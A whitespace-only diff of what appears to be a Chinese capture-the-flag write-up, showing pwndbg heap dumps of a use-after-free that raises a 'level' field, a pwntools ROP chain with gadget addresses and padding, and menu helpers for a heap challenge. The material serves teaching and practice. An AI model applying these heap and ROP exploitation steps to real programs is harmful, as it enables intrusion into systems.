@@ -304,32 +304,32 @@ chunk      0x56476bb25030   0x20            (inuse)
 chunk      0x56476bb25050   0x20fb0         (top)
 sbrk_end   0x56476bb46000
 pwndbg> x/8gx 0x56476bb25010
-0x56476bb25010:	0x0000000000000000	0x0000000000000021
-0x56476bb25020:	0x000056476bb25040	0x0000000000000000
-0x56476bb25030:	0x0000000000000000	0x0000000000000021
-0x56476bb25040:	0x6161616161616161	0x0000000000000005
+0x56476bb25010:    0x0000000000000000    0x0000000000000021
+0x56476bb25020:    0x000056476bb25040    0x0000000000000000
+0x56476bb25030:    0x0000000000000000    0x0000000000000021
+0x56476bb25040:    0x6161616161616161    0x0000000000000005
 ```
 
 可以看到有 2 块 0x20 的 chunk，第一块是结构体指针，存放着 `name` 地址和 `level` 数值；第二块就是 `name` 了，存放着我们输入的 `name`，注意这时第二个 8 字节已经是 5 了。随后我们释放召唤物：
 
 ```
 pwndbg> x/8gx 0x5621c569e010
-0x5621c569e010:	0x0000000000000000	0x0000000000000021
-0x5621c569e020:	0x00005621c569e040	0x0000000000000000
-0x5621c569e030:	0x0000000000000000	0x0000000000000021
-0x5621c569e040:	0x0000000000000000	0x0000000000000005
+0x5621c569e010:    0x0000000000000000    0x0000000000000021
+0x5621c569e020:    0x00005621c569e040    0x0000000000000000
+0x5621c569e030:    0x0000000000000000    0x0000000000000021
+0x5621c569e040:    0x0000000000000000    0x0000000000000005
 ```
 
 这时 `name` 被 `free` 了但指针还在，我们刚刚写的 `\x05` 也还在。这时再召唤就能得到 `0x5621c569e030` 处的一块 chunk 作为结构体指针，而新的 `name` 跑到了 `0x55feced35050`：
 
 ```
 pwndbg> x/12gx 0x55feced35010
-0x55feced35010:	0x0000000000000000	0x0000000000000021
-0x55feced35020:	0x000055feced35040	0x0000000000000000
-0x55feced35030:	0x0000000000000000	0x0000000000000021
-0x55feced35040:	0x000055feced35060	0x0000000000000005
-0x55feced35050:	0x0000000000000000	0x0000000000000021
-0x55feced35060:	0x0000000000000061	0x0000000000000000
+0x55feced35010:    0x0000000000000000    0x0000000000000021
+0x55feced35020:    0x000055feced35040    0x0000000000000000
+0x55feced35030:    0x0000000000000000    0x0000000000000021
+0x55feced35040:    0x000055feced35060    0x0000000000000005
+0x55feced35050:    0x0000000000000000    0x0000000000000021
+0x55feced35060:    0x0000000000000061    0x0000000000000000
 ```
 
 于是此时，结构体指针里的 `level` 就变成了 5。
@@ -374,16 +374,16 @@ pop_rsi = 0x400e41 # 2
 pop3 = 0x400c3a # 1,2,3
 
 strategy = {
-	'gold': flat(pop_rdi,0xdeadbabe,pop_rsi,0xdeadfa11,0,elf.plt['fire_shield']),
-	'wood': flat(pop_rdi,0xdeadbeef,elf.plt['gold_shield']),
-	'water': flat(pop_rdi,0xfee1dead,elf.plt['earth_shield']),
-	'fire': flat(pop3,0xbaaaaaad,0x8badf00d,0xd15ea5e,elf.plt['water_shield']),
-	'earth': flat(pop_rdi,0xcafebabe,pop_rsi,0xdeadbaad,0,elf.plt['wood_shield'])
+    'gold': flat(pop_rdi,0xdeadbabe,pop_rsi,0xdeadfa11,0,elf.plt['fire_shield']),
+    'wood': flat(pop_rdi,0xdeadbeef,elf.plt['gold_shield']),
+    'water': flat(pop_rdi,0xfee1dead,elf.plt['earth_shield']),
+    'fire': flat(pop3,0xbaaaaaad,0x8badf00d,0xd15ea5e,elf.plt['water_shield']),
+    'earth': flat(pop_rdi,0xcafebabe,pop_rsi,0xdeadbaad,0,elf.plt['wood_shield'])
 }
 
 payload = 'a'*0x48
 for attack in elem:
-	payload += strategy[attack]
+    payload += strategy[attack]
 
 pos = 0x6020b0
 payload += flat(pop_rdi,pos,elf.plt['check'])
@@ -410,25 +410,25 @@ sla('Skill> ',payload)
 
 ```python
 def add():
-	sla('> ','1')
+    sla('> ','1')
 
 def delete(index):
-	sla('> ','2')
-	sla(':\n',str(index))
+    sla('> ','2')
+    sla(':\n',str(index))
 
 def edit(index,content):
-	sla('> ','3')
-	sla(':\n',str(index))
-	sla(':\n',content)
+    sla('> ','3')
+    sla(':\n',str(index))
+    sla(':\n',content)
 
 def show():
-	sla('> ','4')
-	ru('0x')
-	return int(ru('\n'),16)
+    sla('> ','4')
+    ru('0x')
+    return int(ru('\n'),16)
 
 def move(dest):
-	sla('> ','5')
-	sla('?\n', str(dest))
+    sla('> ','5')
+    sla('?\n', str(dest))
 
 add() # 0
 add() # 1
